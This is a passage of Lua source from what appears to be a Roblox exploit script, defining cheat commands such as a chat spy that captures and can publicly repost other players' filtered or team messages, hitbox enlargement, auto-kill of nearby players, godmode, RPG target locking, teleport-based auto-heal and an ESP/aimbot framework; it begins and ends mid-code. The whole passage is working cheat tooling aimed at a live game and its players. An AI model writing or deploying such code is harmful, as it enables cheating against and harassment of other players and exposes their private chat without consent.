			local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
			local instance = (_G.chatSpyInstance or 0) + 1
			_G.chatSpyInstance = instance

			local function onChatted(p, msg)
				if _G.chatSpyInstance == instance then
					if p == player and msg:lower():sub(1, 4) == "/spy" then
						enabled = not enabled
						wait(0.3)
						privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
						StarterGui:SetCore("ChatMakeSystemMessage", privateProperties)
					elseif enabled and (spyOnMyself == true or p ~= player) then
						msg = msg:gsub("[\n\r]", ''):gsub("\t", ' '):gsub("[ ]+", ' ')
						local hidden = true
						local conn = getmsg.OnClientEvent:Connect(function(packet, channel)
							if packet.SpeakerUserId == p.UserId and packet.Message == msg:sub(#msg - #packet.Message + 1) and (channel == "All" or (channel == "Team" and public == false and Players[packet.FromSpeaker].Team == player.Team)) then
								hidden = false
							end
						end)
						wait(1)
						conn:Disconnect()
						if hidden and enabled then
							if public then
								saymsg:FireServer((publicItalics and "/me " or '').."{SPY} ["..p.Name.."]: "..msg, "All")
							else
								privateProperties.Text = "{SPY} ["..p.Name.."]: "..msg
								StarterGui:SetCore("ChatMakeSystemMessage", privateProperties)
							end
						end
					end
				end
			end

			for _, p in ipairs(Players:GetPlayers()) do
				p.Chatted:Connect(function(msg)
					onChatted(p, msg)
				end)
			end
			Players.PlayerAdded:Connect(function(p)
				p.Chatted:Connect(function(msg)
					onChatted(p, msg)
				end)
			end)
			privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
			StarterGui:SetCore("ChatMakeSystemMessage", privateProperties)
			if not player.PlayerGui:FindFirstChild("Chat") then
				wait(3)
			end
			local chatFrame = player.PlayerGui.Chat.Frame
			chatFrame.ChatChannelParentFrame.Visible = true
			chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(), chatFrame.ChatChannelParentFrame.Size.Y)
		end;
	});

	addCommand({
		["Name"] = "headless";
		["Function"] = function()
			sendNotif("", "Headless Enabled.", 15);
			pcall(function()
				game.Players.LocalPlayer.Character.Head.Neck:Destroy()
				game.Players.LocalPlayer.Character.UpperTorso.NeckAttachment:Destroy()
				game.Players.LocalPlayer.Character.Humanoid.HealthDisplayDistance = math.huge
				game.Players.LocalPlayer.Character.Humanoid.NameDisplayDistance = math.huge
				game.Players.LocalPlayer.Character.Head.Size = Vector3.new(0, 0, 0)
				game.Players.LocalPlayer.Character.Head.Massless = true
				game.Players.LocalPlayer.Character.Head.CanCollide = false

				heazd = true

				while heazd == true do 
					pcall(function()  
						game.Players.LocalPlayer.Character.Head.NeckRigAttachment.CFrame = CFrame.new(0, 100000.4736328125, 0)
						game.Players.LocalPlayer.Character.UpperTorso.NeckRigAttachment.CFrame = CFrame.new(0, 100000.4736328125, 0)
						game.Players.LocalPlayer.Character.Head.CFrame = CFrame.new(0, 100000.4736328125, 0)
					end)
					wait()
				end
			end)
		end;
	});

	addCommand({
		["Name"] = "boneless";
		["Function"] = function()
			sendNotif("", "Boneless Enabled.", 15);
			local Stuff = {
				"RightHand",
				"LeftHand",
				"RightUpperArm",
				"RightLowerArm",
				"LeftUpperArm",
				"LeftLowerArm",
				"Head",
				"UpperTorso"
			}

			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
					for z, AdminName in ipairs(Stuff) do
						if v.Name == AdminName then
							if v:FindFirstChildOfClass("Motor6D") then
								local Weld = v:FindFirstChildOfClass("Motor6D")
								Weld:Destroy()
							end
						end
					end
				end
			end)
		end;
	});

	local toolreach = false
	addCommand({
		["Name"] = "toolreach";
		["Function"] = function()
			if toolreach == true then
				toolreach = false
				sendNotif("", "Toolreach Disabled.", 15);
				for i, v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren()) do
					if v:isA("Tool") then
						local a = Instance.new("SelectionBox", v.Handle)
						a.Adornee = v.Handle
						v.Handle.Size = Vector3.new(0, 0, 0)
						v.GripPos = Vector3.new(0, 0, 0)
						lplayer.Character.Humanoid:UnequipTools()
					end
				end
			else 
				toolreach = true
				sendNotif("", "Toolreach Enabled.", 15);
				for i, v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren()) do
					if v:isA("Tool") then
						local a = Instance.new("SelectionBox", v.Handle)
						a.Adornee = v.Handle
						v.Handle.Size = Vector3.new(50, 50, 50)
						v.GripPos = Vector3.new(0, 0, 0)
						lplayer.Character.Humanoid:UnequipTools()
					end
				end
			end
		end;
	});

	local fistreach = false
	addCommand({
		["Name"] = "fistreach";
		["Function"] = function()
			sendOutput(" Fistreach Enabled.");
			if fistreach == true then
				fistreach = false
				sendNotif("", "Fistreach Disabled.", 15);
				game.Players.LocalPlayer.Character.RightHand.Size = Vector3.new(0.5, 0.5, 0.5)
				game.Players.LocalPlayer.Character.LeftHand.Size = Vector3.new(0.5, 0.5, 0.5)
				game.Players.LocalPlayer.Character.RightHand.Massless = true
				game.Players.LocalPlayer.Character.LeftHand.Massless = true
				game.Players.LocalPlayer.Character.RightHand.Transparency = 0
				game.Players.LocalPlayer.Character.LeftHand.Transparency = 0   
			else 
				fistreach = true
				sendNotif("", "Fistreach Enabled.", 15);
				game.Players.LocalPlayer.Character.RightHand.Size = Vector3.new(25, 25, 25)
				game.Players.LocalPlayer.Character.LeftHand.Size = Vector3.new(25, 25, 25)
				game.Players.LocalPlayer.Character.RightHand.Massless = true
				game.Players.LocalPlayer.Character.LeftHand.Massless = true
				game.Players.LocalPlayer.Character.RightHand.Transparency = 1
				game.Players.LocalPlayer.Character.LeftHand.Transparency = 1 
			end
		end;
	});

	addCommand({
		["Name"] = "killnearby";
		["Function"] = function()
			sendOutput(" Killnearby Enabled.");
			-- // Settings
			local Settings = {
				["MaxStudDistance"] = 20;
				["LoopBind"] = Enum.KeyCode.E;
			};

			-- // Variables
			local Players 			= game:GetService("Players");
			local localPlayer 		= Players.LocalPlayer;
			local localCharacter = localPlayer.Character;
			local toggle 			= false;

			-- // Services
			local RunService 		= game:GetService("RunService");
			local UserInputService 	= game:GetService("UserInputService");


			-- // Functions
			function cosbyFind(str)
				if (not str) then
					return
				end;
				for _, v in next, Players:GetPlayers() do 
					if (v.Name:lower():find(str:lower()) == 1) then 
						return v.Name;
					end;
				end;
			end;

			function checkDistance(plr)
				local Distance 			= localPlayer:DistanceFromCharacter(game:GetService("Players")[plr].Character:FindFirstChild("HumanoidRootPart").Position);
				if (Distance < Settings.MaxStudDistance) then
					return true; -- // Returns true if they are within the MaxStudDistance.
				else
					return false; -- // Returns false if they aren't in the MaxStudDistance.
				end;
			end;

			function DetatchWrists()
				game:GetService("Players").LocalPlayer.Character:FindFirstChild("RightHand"):FindFirstChild("RightWrist"):Remove();
				game:GetService("Players").LocalPlayer.Character:FindFirstChild("LeftHand"):FindFirstChild("LeftWrist"):Remove();
			end;

			function ReAttachWrists()
				-- // Credits to: i am a corpse#6924 <@!717357503993741362>
				local rightwrist = Instance.new("Motor6D");
				rightwrist.Name = "RightWrist";
				rightwrist.Parent = game:GetService("Players").LocalPlayer.Character.RightHand;
				rightwrist.C0 = CFrame.new(1.18422506e-07, -0.5009287, -6.81715525e-18, 1, 0, 0, 0, 1, 0, 0, 0, 1);
				rightwrist.C1 = CFrame.new(3.55267503e-07, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1);
				rightwrist.Part0 = game:GetService("Players").LocalPlayer.Character.RightLowerArm;
				rightwrist.Part1 = game:GetService("Players").LocalPlayer.Character.RightHand;

				local leftwrist = Instance.new("Motor6D");
				leftwrist.Name = "LeftWrist";
				leftwrist.Parent = game:GetService("Players").LocalPlayer.Character.LeftHand;
				leftwrist.C0 = CFrame.new(0.000475466368, -0.5009287, 7.59417072e-20, 1, 0, 0, 0, 1, 0, 0, 0, 1);
				leftwrist.C1 = CFrame.new(0.000475821638, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1);
				leftwrist.Part0 = game:GetService("Players").LocalPlayer.Character.LeftLowerArm;
				leftwrist.Part1 = game:GetService("Players").LocalPlayer.Character.LeftHand;
			end;

			function TargetPlayer(plr, shit)
				local targ = Players[plr];
				if (targ.Character:FindFirstChild("BodyEffects"):FindFirstChild("K.O").Value == false) then
					repeat
						wait();
						game:GetService("Players").LocalPlayer.Character:FindFirstChild("LeftHand").CFrame = targ.Character:FindFirstChild("UpperTorso").CFrame;
						game:GetService("Players").LocalPlayer.Character:FindFirstChild("RightHand").CFrame = targ.Character:FindFirstChild("UpperTorso").CFrame;
					until targ.Character:FindFirstChild("BodyEffects"):FindFirstChild("K.O").Value == true or toggle == false
				end;
			end;

			-- // Loop Check Distance.
			RunService.RenderStepped:Connect(function()
				if (toggle == true) then
					for _, v in next, Players:GetPlayers() do
						local dist = checkDistance(v.Name);
						if (dist == true) then
							if (v.Name == localPlayer.Name) then
							else
								pcall(TargetPlayer(v.Name, toggle));
							end;
						end;
					end;
				end;
			end);

			UserInputService.InputBegan:Connect(function(key, e)
				if (e) then
					return
				end;
				if (key.KeyCode == Settings.LoopBind) then
					if (toggle == false) then
						toggle = true;
						print("Enabled.")
						pcall(DetatchWrists());
					elseif (toggle == true) then
						toggle = false;
						print("Disabled.")
						pcall(ReAttachWrists());
					end;
				end;
			end);
		end;
	});


	addCommand({
		["Name"] = "godmode";
		["Function"] = function()
			game.Players.LocalPlayer.Character:Destroy()

			while wait() do
				pcall(function()
					if game.Players.LocalPlayer.Character.BodyEffects:FindFirstChild("BreakingParts") then
						game.Players.LocalPlayer.Character.BodyEffects.BreakingParts:Destroy()
						local meh = Instance.new("Folder", game.Players.LocalPlayer.Character)
						meh.Name = "FULLY_LOADED_CHAR"
						wait()
						game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
					end
				end)
			end
		end;
	});

	addCommand({
		["Name"] = "rpglock";
		["Function"] = function(str)
			local target;
			if (str) then
				target = findPlayer(str);
			end;
			if (loopVariables.Rpglock == false) then
				loopVariables.Rpglock = true;
				sendNotif("", "RPG Lock Target Set To "..target.Name..".", 15);
			else
				loopVariables.Rpglock = false;
				sendNotif("", "Disabled RPG Lock")
			end;
			while loopVariables.Rpglock do
				wait();
				pcall(function()
					if game.Workspace.Ignored:FindFirstChild("Launcher") and loopVariables.Rpglock == true and game:GetService("Players")[target.Name].Character then
						local lol = game.Workspace.Ignored:FindFirstChild("Launcher")

						if lol:FindFirstChildOfClass("BodyVelocity") then
							wait()
							lol.BodyVelocity:Destroy()
						end

						if lol:FindFirstChild("BodyVelocity") == nil then
							lol.CFrame = CFrame.new(game:GetService("Players")[target.Name].Character.Head.CFrame.X, game:GetService("Players")[target.Name].Character.Head.CFrame.Y + 6.5, game:GetService("Players")[target.Name].Character.Head.CFrame.Z)
						end

					elseif game.Workspace.Ignored:FindFirstChild("Handle") and nuking == true then
						local lol = game.Workspace.Ignored:FindFirstChild("Handle")

						if lol:FindFirstChild("Pin") then
							lol.CFrame = CFrame.new(game:GetService("Players")[target.Name].Character.Head.CFrame.X, game:GetService("Players")[target.Name].Character.Head.CFrame.Y + 8, game:GetService("Players")[target.Name].Character.Head.CFrame.Z)
						end
					end
				end)
			end;
		end;
	})

	local bag = false
	addCommand({
		["Name"] = "bagall";
		["Function"] = function()
			bag = true
			repeat
				local cor = coroutine.wrap(function()
					if not game:GetService("Players").LocalPlayer.Character:FindFirstChild("[BrownBag]") then
						takingbag = true
						local cor = coroutine.wrap(function()
							game:GetService("Players").LocalPlayer.Character:MoveTo(Vector3.new(-314.580566, 51.1788902, -727.484558))
						end)
						cor()			
						wait(1)
						fireclickdetector(workspace.Ignored.Shop["[BrownBag] - $25"].ClickDetector, 4)
						wait(0.5)
						game:GetService("Players").LocalPlayer.Backpack["[BrownBag]"].Parent = game:GetService("Players").LocalPlayer.Character
						takingbag = false
					end
				end)
				cor()
				if takingbag == false then
					for i, v in pairs(game:GetService("Players"):GetPlayers()) do
						if v.Character:FindFirstChild("Christmas_Sock") == nil and v.Character:FindFirstChildOfClass("ForceField") == nil and v.Character ~= game:GetService("Players").LocalPlayer.Character then
							local chars = v.Character
							if game:GetService("Players").LocalPlayer.Character:FindFirstChild("[BrownBag]") then
								game:GetService("Players").LocalPlayer.Character["[BrownBag]"]:Activate()
							end
							game:GetService("Players").LocalPlayer.Character:MoveTo(v.Character.UpperTorso.Position)
						end
						wait(0.005)
					end
				end
				wait()
			until bag == false
		end;
	});

	addCommand({
		["Name"] = "stopbagall";
		["Function"] = function()
			bag = false
		end;
	});

	addCommand({
		["Name"] = "stopbaggingeveryone";
		["Function"] = function()
			bag = false
		end;
	});

	addCommand({
		["Name"] = "autoeat";
		["Function"] = function()
			gsPlayers = game:GetService("Players")
			gsWorkspace = game:GetService("Workspace")
			gsLighting = game:GetService("Lighting")
			gsReplicatedStorage = game:GetService("ReplicatedStorage")
			gsCoreGui = game:GetService("CoreGui")
			gsTween = game:GetService("TweenService")
			gsHttp = game:GetService("HttpService")

			LP = gsPlayers.LocalPlayer
			Mouse = LP:GetMouse()

			while wait() do
				pcall(function()
					if game.Players.LocalPlayer.Character.Humanoid.Health <= 20 then
						SavedPosition = ""
						SavedPosition = LP.Character.HumanoidRootPart.CFrame
						game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-793.978027, -39.6492004, -938.048706)
						wait(.5)

						fireclickdetector(game.Workspace.Ignored.Shop['[Chicken] - $7'].ClickDetector)
						fireclickdetector(game.Workspace.Ignored.Shop['[Chicken] - $7'].ClickDetector)
						wait(.2)

						local Players = game:GetService("Players")
						local Client = Players.LocalPlayer

						local ToolName = "[Chicken]"
						if Client.Backpack:FindFirstChild(ToolName) then
							Client.Backpack[ToolName].Parent = Client.Character
							wait(.2)
							if game.Players.LocalPlayer.Character:FindFirstChild("[Chicken]") then
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
								wait(0.6)
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
								wait(0.6)
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
								wait(0.6)
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
								wait(0.6)
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
								wait(0.6)
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
								wait(0.6)
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
								wait(0.6)
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
								wait(0.6)
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
								wait(0.6)
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
								wait(0.6)
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
								wait(0.6)
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
							end
							if SavedPosition ~= "" then
								LP.Character.HumanoidRootPart.CFrame = SavedPosition
							end;
						end;
					end;
				end);
			end;
		end;
	});

	local bankcam = false
	addCommand({
		["Name"] = "bankcam";
		["Function"] = function()
			if bankcam == true then
				bankcam = false
				sendNotif("", "Bank Camera Disabled.", 15);
				local plr = game.Players.LocalPlayer

				local SecurityCamera = plr.Character.Humanoid

				game.Workspace.Camera.CameraSubject = SecurityCamera


				plr.PlayerGui.MainScreenGui.SecurityCamera.Visible = false
			else 
				bankcam = true
				sendNotif("", "Bank Camera Enabled.", 15);
				local plr = game.Players.LocalPlayer

				local SecurityCamera = game:GetService("Workspace").Ignored.SecurityCamera.Eye

				game.Workspace.Camera.CameraSubject = SecurityCamera


				plr.PlayerGui.MainScreenGui.SecurityCamera.Visible = true
			end
		end;
	});

	addCommand({
		["Name"] = "bankcamera";
		["Function"] = function()
			if bankcam == true then
				bankcam = false
				sendNotif("", "Bank Camera Disabled.", 15);
				local plr = game.Players.LocalPlayer

				local SecurityCamera = plr.Character.Humanoid

				game.Workspace.Camera.CameraSubject = SecurityCamera


				plr.PlayerGui.MainScreenGui.SecurityCamera.Visible = false
			else 
				bankcam = true
				sendNotif("", "Bank Camera Enabled.", 15);
				local plr = game.Players.LocalPlayer

				local SecurityCamera = game:GetService("Workspace").Ignored.SecurityCamera.Eye

				game.Workspace.Camera.CameraSubject = SecurityCamera


				plr.PlayerGui.MainScreenGui.SecurityCamera.Visible = true
			end
		end;
	});

	addCommand({
		["Name"] = "autosave";
		["Function"] = function()
			gsPlayers = game:GetService("Players")
			gsWorkspace = game:GetService("Workspace")
			gsLighting = game:GetService("Lighting")
			gsReplicatedStorage = game:GetService("ReplicatedStorage")
			gsCoreGui = game:GetService("CoreGui")
			gsTween = game:GetService("TweenService")
			gsHttp = game:GetService("HttpService")

			LP = gsPlayers.LocalPlayer
			Mouse = LP:GetMouse()

			while wait() do
				if game.Players.LocalPlayer.Character.Humanoid.Health <= 20 then
					game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(169.126266, -121.450089, 182.002182)
					if SavedPosition ~= "" then
						LP.Character.HumanoidRootPart.CFrame = SavedPosition
					end
				end
			end

			gsPlayers = game:GetService("Players")
			gsWorkspace = game:GetService("Workspace")
			gsLighting = game:GetService("Lighting")
			gsReplicatedStorage = game:GetService("ReplicatedStorage")
			gsCoreGui = game:GetService("CoreGui")
			gsTween = game:GetService("TweenService")
			gsHttp = game:GetService("HttpService")

			LP = gsPlayers.LocalPlayer
			Mouse = LP:GetMouse()

			while wait() do
				if game.Players.LocalPlayer.Character.Humanoid.Health <= 10 then
					game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(169.126266, -121.450089, 182.002182)
					if SavedPosition ~= "" then
						LP.Character.HumanoidRootPart.CFrame = SavedPosition
					end
				end
			end
		end;
	});

	addCommand({
		["Name"] = "esp";
		["Function"] = function()
			-- Issues:
			-- I'm still working on Tracers, I know they can cause huge frame rate drops. (I think I got it running as smooth as it's going to get.)
			-- Phantom Forces: Weird positioning bug with tracers? Tracer positions a bit behind localplayer. (Maybe make the update faster? > RenderPriority.First ?

			-- Settings can be found on line: 51
			-- Don't change anything if you don't understand.

			local Plrs = game:GetService("Players")
			local Run = game:GetService("RunService")
			local CoreGui = game:GetService("CoreGui")
			local StartGui = game:GetService("StarterGui")
			local Teams = game:GetService("Teams")
			local UserInput = game:GetService("UserInputService")
			local Light = game:GetService("Lighting")
			local HTTP = game:GetService("HttpService")
			local RepStor = game:GetService("ReplicatedStorage")

			function GetCamera() -- Just in case some game renames the player's camera.
				return workspace:FindFirstChildOfClass("Camera")
			end

			local ChamsFolder = Instance.new("Folder", CoreGui)
			ChamsFolder.Name = "Chams"
			local PlayerChams = Instance.new("Folder", ChamsFolder)
			PlayerChams.Name = "PlayerChams"
			local ItemChams = Instance.new("Folder", ChamsFolder)
			ItemChams.Name = "ItemChams"

			local ESPFolder = Instance.new("Folder", CoreGui)
			ESPFolder.Name = "ESP Stuff"
			local PlayerESP = Instance.new("Folder", ESPFolder)
			PlayerESP.Name = "PlayerESP"
			local ItemESP = Instance.new("Folder", ESPFolder)
			ItemESP.Name = "ItemESP"

			local MyPlr = Plrs.LocalPlayer
			local MyChar = MyPlr.Character
			local MyMouse = MyPlr:GetMouse()
			local MyCam = GetCamera()
			if MyCam == nil then
				error("WHAT KIND OF BLACK MAGIC IS THIS, CAMERA NOT FOUND.")
				return
			end

			local Tracers = Instance.new("Folder", MyCam)
			Tracers.Name = "Tracers"
			local TracerData = { }
			local TracerMT = setmetatable(TracerData, {
				__newindex = function(tab, index, val)
					rawset(tab, index, val)
				end
			})

			function RemoveSpacesFromString(Str)
				local newstr = ""
				for i = 1, #Str do
					if Str:sub(i, i) ~= " " then
						newstr = newstr .. Str:sub(i, i)
					end
				end

				return newstr
			end

			function CloneTable(T)
				local temp = { }
				for i,v in next, T do
					if type(v) == "table" then
						temp[i] = CloneTable(v)
					else
						temp[i] = v 
					end
				end
				return temp
			end

			local Bullshit = {
				ESPEnabled = false, -- Self explanatory. LEAVE OFF BY DEFAULT.
				CHAMSEnabled = false, -- Self explanatory. LEAVE OFF BY DEFAULT.
				TracersEnabled = false, -- Self explanatory. LEAVE OFF BY DEFAULT.
				DebugInfo = false, -- Self explanatory. LEAVE OFF BY DEFAULT.
				OutlinesEnabled = false,
				FullbrightEnabled = false,
				CrosshairEnabled = false,
				AimbotEnabled = false,
				Aimbot = false,
				TracersLength = 500, -- MAX DISTANCE IS 2048 DO NOT GO ABOVE OR YOU'LL ENCOUNTER PROBLEMS.
				ESPLength = 10000,
				CHAMSLength = 500,
				PlaceTracersUnderCharacter = false, -- Change to true if you want tracers to be placed under your character instead of at the bottom of your camera.
				FreeForAll = false, -- use for games that don't have teams (Apocalypse Rising)
				AutoFire = false,
				MobChams = false,
				MobESP = false,
				AimbotKey = "Enum.UserInputType.MouseButton2", -- Doesn't do anything yet.
				Colors = {
					Enemy = Color3.new(1, 0, 0),
					Ally = Color3.new(0, 1, 0),
					Friend = Color3.new(1, 1, 0),
					Neutral = Color3.new(1, 1, 1),
					Crosshair = Color3.new(1, 0, 0),
					ColorOverride = nil, -- Every player will have the chosen color regardless of enemy or ally.
				},

				-- VVVV DON'T EDIT BELOW VVVV --
				ClosestEnemy = nil,
				CharAddedEvent = { },
				OutlinedParts = { },
				WorkspaceChildAddedEvent = nil,
				LightingEvent = nil,
				AmbientBackup = Light.Ambient,
				ColorShiftBotBackup = Light.ColorShift_Bottom,
				ColorShiftTopBackup = Light.ColorShift_Top,
				FPSAverage = { },
				Blacklist = { },
				FriendList = { },
				CameraModeBackup = MyPlr.CameraMode,
				GameSpecificCrap = { 
				},
				Mob_ESP_CHAMS_Ran_Once = false,
			}

			function SaveBullshitSettings()
				local temp = { }
				local succ, out = pcall(function()
					temp.TracersLength = Bullshit.TracersLength
					temp.ESPLength = Bullshit.ESPLength
					temp.CHAMSLength = Bullshit.CHAMSLength
					temp.PlaceTracersUnderCharacter = Bullshit.PlaceTracersUnderCharacter
					temp.FreeForAll = Bullshit.FreeForAll
					temp.AutoFire = Bullshit.AutoFire
					temp.AimbotKey = tostring(Bullshit.AimbotKey)
					temp.MobChams = Bullshit.MobChams
					temp.MobESP = Bullshit.MobESP
					temp.Colors = { }
					for i, v in next, Bullshit.Colors do
						temp.Colors[i] = tostring(v)
					end
					writefile("ProjectBullshit.txt", HTTP:JSONEncode(temp))
				end)
				if not succ then
					error(out)
				end
			end

			fuck = pcall(function()
				local temp = HTTP:JSONDecode(readfile("ProjectBullshit.txt"))
				if temp.MobChams ~= nil and temp.MobESP ~= nil then
					for i, v in next, temp do
						if i ~= "Colors" then
							Bullshit[i] = v
						end
					end
					for i, v in next, temp.Colors do
						local r, g, b = string.match(RemoveSpacesFromString(v), "(%d+),(%d+),(%d+)")
						r = tonumber(r)
						g = tonumber(g)
						b = tonumber(b)

						temp.Colors[i] = Color3.new(r, g, b)
					end
					Bullshit.Colors = temp.Colors
				else
					spawn(function()
						SaveBullshitSettings()
						local hint = Instance.new("Hint", CoreGui)
						hint.Text = "Major update requried your settings to be wiped! Sorry!"
						wait(5)
						hint:Destroy()
					end)
				end

				Bullshit.AutoFire = false
			end)

			-- Load blacklist file if it exists
			fuck2 = pcall(function()
				Bullshit.Blacklist = HTTP:JSONDecode(readfile("Blacklist.txt"))
			end)

			fuck3 = pcall(function()
				Bullshit.FriendList = HTTP:JSONDecode(readfile("Whitelist.txt"))
			end)

			local DebugMenu = { }
			DebugMenu["SC"] = Instance.new("ScreenGui", CoreGui)
			DebugMenu["SC"].Name = "Debug"
			DebugMenu["Main"] = Instance.new("Frame", DebugMenu["SC"])
			DebugMenu["Main"].Name = "Debug Menu"
			DebugMenu["Main"].Position = UDim2.new(0, 20, 1, -220)
			DebugMenu["Main"].Size = UDim2.new(1, 0, 0, 200)
			DebugMenu["Main"].BackgroundTransparency = 1
			DebugMenu["Main"].Visible = false
			if game.PlaceId == 606849621 then
				DebugMenu["Main"].Position = UDim2.new(0, 230, 1, -220)
			end
			DebugMenu["Main"].Draggable = true
			DebugMenu["Main"].Active = true
			DebugMenu["Position"] = Instance.new("TextLabel", DebugMenu["Main"])
			DebugMenu["Position"].BackgroundTransparency = 1
			DebugMenu["Position"].Position = UDim2.new(0, 0, 0, 0)
			DebugMenu["Position"].Size = UDim2.new(1, 0, 0, 15)
			DebugMenu["Position"].Font = "Arcade"
			DebugMenu["Position"].Text = ""
			DebugMenu["Position"].TextColor3 = Color3.new(1, 1, 1)
			DebugMenu["Position"].TextSize = 15
			DebugMenu["Position"].TextStrokeColor3 = Color3.new(0, 0, 0)
			DebugMenu["Position"].TextStrokeTransparency = 0.3
			DebugMenu["Position"].TextXAlignment = "Left"
			DebugMenu["FPS"] = Instance.new("TextLabel", DebugMenu["Main"])
			DebugMenu["FPS"].BackgroundTransparency = 1
			DebugMenu["FPS"].Position = UDim2.new(0, 0, 0, 15)
			DebugMenu["FPS"].Size = UDim2.new(1, 0, 0, 15)
			DebugMenu["FPS"].Font = "Arcade"
			DebugMenu["FPS"].Text = ""
			DebugMenu["FPS"].TextColor3 = Color3.new(1, 1, 1)
			DebugMenu["FPS"].TextSize = 15
			DebugMenu["FPS"].TextStrokeColor3 = Color3.new(0, 0, 0)
			DebugMenu["FPS"].TextStrokeTransparency = 0.3
			DebugMenu["FPS"].TextXAlignment = "Left"
			DebugMenu["PlayerSelected"] = Instance.new("TextLabel", DebugMenu["Main"])
			DebugMenu["PlayerSelected"].BackgroundTransparency = 1
			DebugMenu["PlayerSelected"].Position = UDim2.new(0, 0, 0, 35)
			DebugMenu["PlayerSelected"].Size = UDim2.new(1, 0, 0, 15)
			DebugMenu["PlayerSelected"].Font = "Arcade"
			DebugMenu["PlayerSelected"].Text = ""
			DebugMenu["PlayerSelected"].TextColor3 = Color3.new(1, 1, 1)
			DebugMenu["PlayerSelected"].TextSize = 15
			DebugMenu["PlayerSelected"].TextStrokeColor3 = Color3.new(0, 0, 0)
			DebugMenu["PlayerSelected"].TextStrokeTransparency = 0.3
			DebugMenu["PlayerSelected"].TextXAlignment = "Left"
			DebugMenu["PlayerTeam"] = Instance.new("TextLabel", DebugMenu["Main"])
			DebugMenu["PlayerTeam"].BackgroundTransparency = 1
			DebugMenu["PlayerTeam"].Position = UDim2.new(0, 0, 0, 50)
			DebugMenu["PlayerTeam"].Size = UDim2.new(1, 0, 0, 15)
			DebugMenu["PlayerTeam"].Font = "Arcade"
			DebugMenu["PlayerTeam"].Text = ""
			DebugMenu["PlayerTeam"].TextColor3 = Color3.new(1, 1, 1)
			DebugMenu["PlayerTeam"].TextSize = 15
			DebugMenu["PlayerTeam"].TextStrokeColor3 = Color3.new(0, 0, 0)
			DebugMenu["PlayerTeam"].TextStrokeTransparency = 0.3
			DebugMenu["PlayerTeam"].TextXAlignment = "Left"
			DebugMenu["PlayerHealth"] = Instance.new("TextLabel", DebugMenu["Main"])
			DebugMenu["PlayerHealth"].BackgroundTransparency = 1
			DebugMenu["PlayerHealth"].Position = UDim2.new(0, 0, 0, 65)
			DebugMenu["PlayerHealth"].Size = UDim2.new(1, 0, 0, 15)
			DebugMenu["PlayerHealth"].Font = "Arcade"
			DebugMenu["PlayerHealth"].Text = ""
			DebugMenu["PlayerHealth"].TextColor3 = Color3.new(1, 1, 1)
			DebugMenu["PlayerHealth"].TextSize = 15
			DebugMenu["PlayerHealth"].TextStrokeColor3 = Color3.new(0, 0, 0)
			DebugMenu["PlayerHealth"].TextStrokeTransparency = 0.3
			DebugMenu["PlayerHealth"].TextXAlignment = "Left"
			DebugMenu["PlayerPosition"] = Instance.new("TextLabel", DebugMenu["Main"])
			DebugMenu["PlayerPosition"].BackgroundTransparency = 1
			DebugMenu["PlayerPosition"].Position = UDim2.new(0, 0, 0, 80)
			DebugMenu["PlayerPosition"].Size = UDim2.new(1, 0, 0, 15)
			DebugMenu["PlayerPosition"].Font = "Arcade"
			DebugMenu["PlayerPosition"].Text = ""
			DebugMenu["PlayerPosition"].TextColor3 = Color3.new(1, 1, 1)
			DebugMenu["PlayerPosition"].TextSize = 15
			DebugMenu["PlayerPosition"].TextStrokeColor3 = Color3.new(0, 0, 0)
			DebugMenu["PlayerPosition"].TextStrokeTransparency = 0.3
			DebugMenu["PlayerPosition"].TextXAlignment = "Left"
			DebugMenu["BehindWall"] = Instance.new("TextLabel", DebugMenu["Main"])
			DebugMenu["BehindWall"].BackgroundTransparency = 1
			DebugMenu["BehindWall"].Position = UDim2.new(0, 0, 0, 95)
			DebugMenu["BehindWall"].Size = UDim2.new(1, 0, 0, 15)
			DebugMenu["BehindWall"].Font = "Arcade"
			DebugMenu["BehindWall"].Text = ""
			DebugMenu["BehindWall"].TextColor3 = Color3.new(1, 1, 1)
			DebugMenu["BehindWall"].TextSize = 15
			DebugMenu["BehindWall"].TextStrokeColor3 = Color3.new(0, 0, 0)
			DebugMenu["BehindWall"].TextStrokeTransparency = 0.3
			DebugMenu["BehindWall"].TextXAlignment = "Left"

			local LastTick = tick()
			local FPSTick = tick()

			if #Teams:GetChildren() <= 0 then
				Bullshit.FreeForAll = true
			end

			if Bullshit.TracersLength > 2048 then
				Bullshit.TracersLength = 2048
			end

			if Bullshit.CHAMSLength > 2048 then
				Bullshit.CHAMSLength = 2048
			end

			local wildrevolvertick = tick()
			local wildrevolverteamdata = nil
			function GetTeamColor(Plr)
				if Plr == nil then return nil end
				if not Plr:IsA("Player") then
					return nil
				end
				local PickedColor = Bullshit.Colors.Enemy

				if Plr ~= nil then
					if game.PlaceId == 606849621 then
						if Bullshit.Colors.ColorOverride == nil then
							if not Bullshit.FreeForAll then
								if MyPlr.Team ~= nil and Plr.Team ~= nil then
									if Bullshit.FriendList[Plr.Name] == nil then
										if MyPlr.Team.Name == "Prisoner" then
